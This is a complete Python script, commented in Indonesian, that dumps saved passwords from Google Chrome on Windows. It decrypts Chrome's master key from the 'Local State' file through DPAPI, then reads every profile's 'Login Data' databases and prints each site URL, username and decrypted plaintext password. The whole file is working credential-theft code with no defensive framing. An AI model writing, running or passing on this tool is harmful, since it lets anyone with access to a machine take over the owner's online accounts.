import os
import json
from base64 import b64decode
import sqlite3
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import shutil

# Fungsi untuk mendapatkan kunci master dari file Local State Chrome
def get_master_key(local_state):
    with open(local_state, "r", encoding="utf-8") as f:
        state = json.loads(f.read())
    master_key = b64decode(state["os_crypt"]["encrypted_key"])[5:]  # Mengambil kunci terenkripsi
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]  # Mendekripsi kunci master
    return master_key

# Fungsi untuk mendekripsi password menggunakan kunci master
def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # Menghapus byte akhir
        return decrypted_pass
    except:
        return "Decryption Failed"

# Fungsi untuk mengekstrak data login dari database Chrome
def extract_login_data(login_data_path, master_key):
    if not os.path.exists(login_data_path):
        return
    temp_path = "temp_login_data"
    shutil.copy2(login_data_path, temp_path)
    conn = sqlite3.connect(temp_path)
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url, username, encrypted_password = r
            if username:
                decrypted_password = decrypt_password(encrypted_password, master_key)
                print(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n{'-'*50}")
    except Exception as e:
        print(f"Error processing {login_data_path}: {e}")
    finally:
        cursor.close()
        conn.close()
        os.remove(temp_path)

if __name__ == "__main__":
    user_data_path = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google", "Chrome", "User Data")
    local_state_path = os.path.join(user_data_path, "Local State")
    master_key = get_master_key(local_state_path)

    for profile_folder in os.listdir(user_data_path):
        profile_path = os.path.join(user_data_path, profile_folder)
        if os.path.isdir(profile_path):
            # Memeriksa berbagai varian file Login Data
            login_data_variants = ["Login Data", "Login Data for Account", "Login Data-journal", "Login Data for Account-journal"]
            for variant in login_data_variants:
                login_data_path = os.path.join(profile_path, variant)
                extract_login_data(login_data_path, master_key)
